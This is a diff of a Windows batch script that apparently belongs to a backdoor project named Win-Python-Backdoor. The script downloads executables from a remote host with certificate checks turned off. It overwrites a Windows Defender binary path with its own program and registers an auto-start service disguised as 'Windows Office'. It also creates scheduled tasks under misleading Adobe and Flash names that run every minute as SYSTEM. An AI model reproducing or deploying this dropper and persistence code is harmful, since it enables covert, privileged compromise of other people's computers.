@@ -60,7 +60,8 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
-wget --no-check-certificate %urlgit%/win/wup.exe  -O %windir%\wup1.exe
+set wupname=wup2
+wget --no-check-certificate %urlgit%/win/wup.exe  -O %windir%\%wupname%.exe
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup1.exe
 
 taskkill /f /im woffice2.exe
@@ -81,12 +82,13 @@ wget --no-check-certificate %urlgit%/win/woffice.exe  -O %windir%\woffice2.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
-taskkill /f /im wup1.exe
-net stop wup1
+taskkill /f /im %wupname%.exe
+net stop %wupname%
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
+
 copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
-sc create wup1 binPath= "%windir%\wup1.exe" DisplayName= "Windows Office" start= auto
-net start wup1
+sc create %wupname% binPath= "%windir%\%wupname%.exe" DisplayName= "Windows Office" start= auto
+net start %wupname%
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice2.exe" /tn myadobe2 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice2.exe" /tn myflash /rl highest /F
